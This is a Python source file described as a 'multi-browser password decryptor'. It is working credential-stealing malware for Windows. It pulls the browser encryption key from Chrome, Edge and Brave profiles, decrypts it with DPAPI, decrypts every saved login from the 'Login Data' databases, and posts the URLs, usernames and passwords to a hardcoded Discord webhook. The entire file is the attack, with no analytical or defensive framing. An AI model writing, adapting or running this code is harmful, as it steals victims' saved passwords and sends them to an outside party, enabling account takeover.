import os
import json
import base64
import sqlite3
import argparse
from typing import Dict
import requests
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from colorama import Fore, Style

# Hardcoded Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1331516430343999569/cK2Pfa_jiHwMauM4LyW54D3hUAaBl1QqvhgL04B8-u4HaQwxzNLt_bHL3tZbUBTziq7m"

class BrowserPasswordDecryptor:
    def __init__(self):
        self.browser_paths = {
            "chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data"),
            "edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data"),
            "brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data"),
            "firefox": os.path.join(os.getenv("APPDATA"), "Mozilla\\Firefox\\Profiles")
        }

    def get_encryption_key(self, browser_path: str) -> bytes:
        try:
            with open(os.path.join(browser_path, "Local State"), "r", encoding="utf-8") as file:
                local_state = json.load(file)
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            return CryptUnprotectData(key[5:], None, None, None, 0)[1]
        except Exception as e:
            print(f"{Fore.RED}[ERR] Failed to retrieve encryption key: {e}{Style.RESET_ALL}")
            return None

    def decrypt_password(self, encrypted_password: bytes, key: bytes) -> str:
        try:
            if encrypted_password[:3] == b'v10':
                iv = encrypted_password[3:15]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted_password = cipher.decrypt(encrypted_password[15:])[:-16].decode()
                return decrypted_password
            else:
                return CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
        except Exception as e:
            print(f"{Fore.RED}[ERR] Failed to decrypt password: {e}{Style.RESET_ALL}")
            return ""

    def get_passwords(self, browser: str, browser_path: str, profile: str) -> list:
        passwords = []
        key = self.get_encryption_key(browser_path)
        if not key:
            return passwords

        login_db = os.path.join(browser_path, profile, "Login Data")
        if not os.path.exists(login_db):
            return passwords

        try:
            conn = sqlite3.connect(login_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                decrypted_password = self.decrypt_password(encrypted_password, key)
                if url and username and decrypted_password:
                    passwords.append({"url": url, "username": username, "password": decrypted_password})
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"{Fore.RED}[ERR] Failed to retrieve passwords: {e}{Style.RESET_ALL}")
        return passwords

    def decrypt_all(self, browsers: list, quiet: bool) -> Dict:
        all_passwords = {}
        for browser in browsers:
            if browser in self.browser_paths:
                browser_path = self.browser_paths[browser]
                if not os.path.exists(browser_path):
                    if not quiet:
                        print(f"{Fore.YELLOW}[INFO] {browser.capitalize()} not installed.{Style.RESET_ALL}")
                    continue

                profiles = [p for p in os.listdir(browser_path) if p.startswith("Default") or p.startswith("Profile")]
                for profile in profiles:
                    if not quiet:
                        print(f"{Fore.GREEN}[INFO] Decrypting passwords for {browser.capitalize()} ({profile})...{Style.RESET_ALL}")
                    passwords = self.get_passwords(browser, browser_path, profile)
                    if passwords:
                        if browser not in all_passwords:
                            all_passwords[browser] = {}
                        all_passwords[browser][profile] = passwords
        return all_passwords

def send_to_webhook(passwords: Dict):
    content = ""
    for browser, profiles in passwords.items():
        for profile, creds in profiles.items():
            for cred in creds:
                content += f"Browser: {browser}\n"
                content += f"Profile: {profile}\n"
                content += f"URL: {cred['url']}\n"
                content += f"Username: {cred['username']}\n"
                content += f"Password: {cred['password']}\n"
                content += "-" * 40 + "\n"

    if content.strip():
        data = {
            "content": f"```\n{content[:1990]}\n```"  # Discord limits message length to 2000 characters
        }
        response = requests.post(DISCORD_WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print(f"{Fore.GREEN}[SUCCESS] Passwords sent to Discord webhook successfully.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[ERR] Failed to send to webhook. Status: {response.status_code}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[INFO] No passwords to send.{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='Multi-browser password decryptor')
    parser.add_argument('-b', '--browsers', nargs='+', default=['chrome'],
                       choices=['chrome', 'edge', 'brave', 'firefox'])
    parser.add_argument('-q', '--quiet', action='store_true')
    args = parser.parse_args()

    decryptor = BrowserPasswordDecryptor()
    passwords = decryptor.decrypt_all(args.browsers, args.quiet)
    send_to_webhook(passwords)

if __name__ == '__main__':
    main()